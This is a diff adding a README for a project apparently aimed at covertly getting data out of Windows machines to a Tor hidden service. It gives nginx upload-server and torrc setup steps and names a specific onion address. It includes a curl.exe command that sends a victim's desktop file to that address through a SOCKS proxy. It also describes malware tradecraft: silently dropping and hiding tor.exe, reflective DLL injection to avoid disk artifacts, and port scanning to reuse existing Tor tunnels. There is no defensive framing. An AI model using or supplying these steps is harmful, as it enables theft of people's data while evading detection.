@@ -1,2 +1,51 @@
 # data-exfiltration-via-tor
 steps to exfiltrate data from a windows machine to a web server on the dark web programatically
+
+- ## Problems
+	- host a web server on TOR and exfilitrate data to it.
+	- Figure out how to use C and win32 API to connect to onion links.
+- ## Web Server Config (nginx)
+	- Set up a folder on the server (nginx/apache2) to make the client UPLOAD files to it (maybe make it authenticatable). Also, make the web server use SSL/TLS (**TOR doesn't need that)**.
+	- first install nginx and apache2-utils that have the `htpasswd` utility used to generate encrypted http basic auth creds.
+		- `sudo apt install nginx apache2-utils -y`
+	- then create basic auth creds
+		- `sudo htpasswd -c /etc/nginx/.htpasswd uploaduser`
+	- (**this isn't necessary if we user TOR**) install `certbot` to enable SSL/TLS
+		- `sudo apt install certbot`
+		- `apt install python3-certbot-nginx -y`
+	- create a `file-upload.conf` config file that configures the server to handle uploads in `/etc/nginx/sites-available` directory
+	- Enable the newly created configuration by linking it to `sites-enabled`:
+		- `sudo ln -s /etc/nginx/sites-available/file-upload.conf /etc/nginx/sites-enabled/`
+	- Remove or disable the default configuration (if active) to prevent conflicts:
+		- `sudo rm -f /etc/nginx/sites-enabled/default`
+	- Create the `uploads` directory in `/var/www/` with appropriate permissions
+		- `sudo mkdir -p /var/www/uploads`
+		- `sudo chown -R www-data:www-data /var/www/uploads`
+		- `sudo chmod -R 755 /var/www/uploads` # standard write permissions
+	- Test the upload via the curl command (PUT request)
+		- `curl -u uploaduser:123 -T /home/user/Desktop/upload_file.txt http://localhost/uploads/targetfile.txt`
+- ## Host the server on TOR
+	- Install `tor` and `obfs4proxy`
+		- `sudo apt install tor obfs4proxy`
+	- configure the `torrc` config file and the obfs4proxy bridges
+		- `HiddenServiceDir /var/lib/tor/hidden_service/`
+		- `HiddenServicePort 80 127.0.0.1:80`
+	- the onion link doesn't change as long as you have the private key generated
+	- `s2ybv7hq7vq6zkokzob2ipvrnne4e2mmjgcob5primnnb263lnq4hbyd.onion`
+	- test the upload
+		- `curl -u uploaduser:123 --socks5-hostname 127.0.0.1:9050 -T /home/user/Desktop/upload_file.txt http://s2ybv7hq7vq6zkokzob2ipvrnne4e2mmjgcob5primnnb263lnq4hbyd.onion/uploads/targetfile_tor_localhost.txt`
+- ## How can a windows machine piggyback behind a tor connection to exfilitrate data? 
+	- ### Find a way to get TOR to the victim.
+		- [Tor Expert Bundle](https://download.torproject.org/tor/) downloads standalone tor with no browser. Perfect for us.
+	- ### Bundled & Embedded Tor Client Execution
+		- To ensure a local SOCKS5 proxy endpoint exists on the victim host, C malware often drops or embeds its own Tor daemon.
+			- #### Silent Process Spawning:
+				- The binary extracts an encrypted `tor.exe` payload to a directory like `%TEMP%` or `%APPDATA%`, writes a minimal `torrc` file (defining `SocksPort 9050`), and spawns the process hidden using `CreateProcessA` with `CREATE_NO_WINDOW` or `STARTUPINFO` flags (`wShowWindow = SW_HIDE`).
+				- The curl command to exfilitrate data
+					- `curl.exe -u uploaduser:123 --socks5-hostname 127.0.0.1:9050 -T "C:\Users\Victim\Desktop\win_test.txt" "http://s2ybv7hq7vq6zkokzob2ipvrnne4e2mmjgcob5primnnb263lnq4hbyd.onion/uploads/win_test.txt"`
+			- #### In-Memory Tor (libtor/MicroSocks): 
+				- Advanced malware compiles `libtor` or custom lightweight C SOCKS proxies into DLLs, loading them directly into memory (e.g., via Reflective DLL Injection) to avoid creating `tor.exe` disk artifacts.
+			- #### Port Enumeration (not needed as tor.exe does it already): 
+				- Prior to launching its own daemon, the malware may scan local TCP ports (`9050`, `9150`) or check the Windows process list for active `tor.exe` / browser instances to piggyback off existing dark web tunnels.
+	- ### Tor2Web (less safe / Unstable)
+		- https://www.tor2web.org/
